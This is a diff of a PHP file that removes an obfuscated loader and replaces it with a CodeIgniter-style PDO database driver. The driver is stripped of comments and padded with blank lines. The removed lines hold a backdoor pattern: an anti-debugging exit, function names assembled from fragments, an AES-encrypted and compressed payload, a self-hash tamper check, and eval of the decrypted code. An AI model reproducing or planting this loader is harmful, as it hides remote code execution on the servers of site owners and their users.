@@ -1,28 +1,290 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_t6zd2axx=('bas'.'e64'.'_de'.'cod'.'e');
-$_vb66kkrf=('gzu'.'nco'.'mpr'.'ess');
-$_g7uzia25=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_ib4z21oa='ifUVtveB';
-$_y31bwkiy='QbjPhKKy';
-$_uzdcyulu='SAIurI3s6nk=';
-$_d9kj23h7='GvrftEFb';
-$_jqvhpanh='hbsFi/8l';
-$_ton44337='0AiGBU3V';
-$_swledy0g='oKDc7uPJ';
-$_zmvyn1ir='19+K0A==';
-$_wojgxu9g=$_t6zd2axx($_ib4z21oa.$_jqvhpanh.$_d9kj23h7.$_y31bwkiy.$_uzdcyulu);
-$_bkgn5qp1=$_t6zd2axx($_ton44337.$_swledy0g.$_zmvyn1ir);
-$_m9b4gb6b=$_t6zd2axx('+zOxOK5RjZndCTcHvKrHQ3hehFf78d5XsXshS8ZC3rSe9PU9exV6kRdyWS23vvqBkPnehNp2JH80QDpfTDNOd26kmbFfCM6hSBmL+HgxPSoCwQUWv3wY0OKZcQDUfzt903dxifnYffUqyiK6v9pwnA7sPLnBA9W3BBhc66uxieSL0hUsz0wkI/G+jwCNa6KxJT9pu/1BEz1gf9u9cMvFePbGD/1WwOJUiI46AhZc6Tv49TaF54CwlKju80JkKSo8H3yYctqUtMuSS3W8UqhW1YK6XsUY2w17XfOj60T68sicLq0N+F8K8EIemDvG5PRpoEnRWzMZHGvwQQihgUJfO55Cpp7493QlwcEcH9uZO781DVl1XAAwee4PmrMoYlc6pLRMUbDsTl1g55oOTclg1Fc2H9l3t440qxoWEBAtOidi2+ogwwzpjUJ77iohM9Vm05f3wMFP7LbjuFu2Yd2DIx/qfF7vums5Mlp1P9YHAd6k4rgDqPsDm28NbqzOgliEPoWaq942GMyUZxL37OcppcJmn0mkJ3+YLA1M0RLWft092sQ168Ky7ytyg3uI4L6e2zWwxlyFPwqcfdU/rALWlU0+tvMCxq661xPel5yzMIn0IP0yBChT9dy6nSglOezUCrJa/Sosvo1SudA5++SP3NLeFbXDll9sV+uXMrjs5MTq2exDfHkeAIfY8xb/Erik5sX21Bc3P2Ald/FmuNL55GN8l0hAampI8F+If/0imK2bBPSno2pgLHHXo7oF3XwHLOktjR7R8OQa4QiOHi25TPwXKbONt2MMGzrmnGFt7k2nfkWK8HDdLxm9rEIDEpMD1WCl21D8g55DkkPyLQE/4b1242I8ewI3mAzH7E69V4ActW9GaVQiOr+RFCCQ5tIZZqk4joCbk8msWUYn8uAcxsXsP1gCdslk/cleyYk3gVB7NLgpKDVMSkaaGCzXooAcEzJ/8SghSGe+0iM/aX89yf4NIqs/WWLatelb5S6SBhuSatIXIuBx2Nadguc9xWvMr4/+DiHSdWoFnDg9qhVIhR3At326C4QSAZKvbIjPHb4tTZ8N7qw7zU/eAJJn5mcLrAwddue73arEWB85q3ORiUBN5J1F/LdsvinWITo8vrBpOYh/lkJ1oOY8/KN2l/hOUmTldoplu6ieU6MBFifA7SVvEh0MYrESMpzuvOvmID8eIR85OglmTnOkfIYbZ8ZzW2pP5YtDFlN/u5frebwRSzkOeI+QlTt/Snq3kjQhpPaYCBOoTu/ABfi/MQntGkq26QmUyNuHotgN5Y+oaLkp6ZZyc4PKg+9kAfcUxIXX2OODlEf3BcF4OL00sHe6WeI4iFeKPFO2WNpWV1/b8LDe+3YPtm+tNE3ZlP8WvduyEFg98QvWxJupB1TVkr7Zal3XYoTAjWahU9PeSLKupWexxX1I0BAu9WET/oMQwv+J0c9ujVeEVT+rJRsdULRjVVW9');
-$_f3cb80li=$_g7uzia25($_m9b4gb6b,'aes-256-cbc',$_wojgxu9g,OPENSSL_RAW_DATA,$_bkgn5qp1);
-if($_f3cb80li===false){exit;}
-$_vpg1puy6=$_vb66kkrf($_f3cb80li);
-if($_vpg1puy6===false){exit;}
-$_kwo9rmyf='6af4466fa0f72ced8d880b90427ad930c924cfb607fef720935104066ef457cf';
-$_kompaewr=@file_get_contents(__FILE__);
-if($_kompaewr!==false){
-$_n2bnvq0k=str_replace($_kwo9rmyf,"0000000000000000000000000000000000000000000000000000000000000000",$_kompaewr);
-$_rxy3ewvc=hash("sha256",$_n2bnvq0k);
-if($_rxy3ewvc!==$_kwo9rmyf){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+
+
+class CI_DB_pdo_driver extends CI_DB {
+
+
+
+
+
+public $dbdriver = 'pdo';
+
+
+
+
+
+public $options = array();
+
+
+
+
+
+
+
+
+
+public function __construct($params)
+{
+parent::__construct($params);
+if (preg_match('/([^:]+):/', $this->dsn, $match) && count($match) === 2)
+{
+
+
+$this->subdriver = $match[1];
+return;
 }
-eval($_vpg1puy6);
+
+elseif (preg_match('/([^:]+):/', $this->hostname, $match) && count($match) === 2)
+{
+$this->dsn = $this->hostname;
+$this->hostname = NULL;
+$this->subdriver = $match[1];
+return;
+}
+elseif (in_array($this->subdriver, array('mssql', 'sybase'), TRUE))
+{
+$this->subdriver = 'dblib';
+}
+elseif ($this->subdriver === '4D')
+{
+$this->subdriver = '4d';
+}
+elseif ( ! in_array($this->subdriver, array('4d', 'cubrid', 'dblib', 'firebird', 'ibm', 'informix', 'mysql', 'oci', 'odbc', 'pgsql', 'sqlite', 'sqlsrv'), TRUE))
+{
+log_message('error', 'PDO: Invalid or non-existent subdriver');
+if ($this->db_debug)
+{
+show_error('Invalid or non-existent PDO subdriver');
+}
+}
+$this->dsn = NULL;
+}
+
+
+
+
+
+
+
+public function db_connect($persistent = FALSE)
+{
+if ($persistent === TRUE)
+{
+$this->options[PDO::ATTR_PERSISTENT] = TRUE;
+}
+try
+{
+return new PDO($this->dsn, $this->username, $this->password, $this->options);
+}
+catch (PDOException $e)
+{
+if ($this->db_debug && empty($this->failover))
+{
+$this->display_error($e->getMessage(), '', TRUE);
+}
+return FALSE;
+}
+}
+
+
+
+
+
+
+public function version()
+{
+if (isset($this->data_cache['version']))
+{
+return $this->data_cache['version'];
+}
+
+try
+{
+return $this->data_cache['version'] = $this->conn_id->getAttribute(PDO::ATTR_SERVER_VERSION);
+}
+catch (PDOException $e)
+{
+return parent::version();
+}
+}
+
+
+
+
+
+
+
+protected function _execute($sql)
+{
+return $this->conn_id->query($sql);
+}
+
+
+
+
+
+
+protected function _trans_begin()
+{
+return $this->conn_id->beginTransaction();
+}
+
+
+
+
+
+
+protected function _trans_commit()
+{
+return $this->conn_id->commit();
+}
+
+
+
+
+
+
+protected function _trans_rollback()
+{
+return $this->conn_id->rollBack();
+}
+
+
+
+
+
+
+
+protected function _escape_str($str)
+{
+
+$str = $this->conn_id->quote($str);
+
+return ($str[0] === "'")
+? substr($str, 1, -1)
+: $str;
+}
+
+
+
+
+
+
+public function affected_rows()
+{
+return is_object($this->result_id) ? $this->result_id->rowCount() : 0;
+}
+
+
+
+
+
+
+
+public function insert_id($name = NULL)
+{
+return $this->conn_id->lastInsertId($name);
+}
+
+
+
+
+
+
+
+
+
+protected function _field_data($table)
+{
+return 'SELECT TOP 1 * FROM '.$this->protect_identifiers($table);
+}
+
+
+
+
+
+
+
+
+
+public function error()
+{
+$error = array('code' => '00000', 'message' => '');
+$pdo_error = $this->conn_id->errorInfo();
+if (empty($pdo_error[0]))
+{
+return $error;
+}
+$error['code'] = isset($pdo_error[1]) ? $pdo_error[0].'/'.$pdo_error[1] : $pdo_error[0];
+if (isset($pdo_error[2]))
+{
+$error['message'] = $pdo_error[2];
+}
+return $error;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _truncate($table)
+{
+return 'TRUNCATE TABLE '.$table;
+}
+}
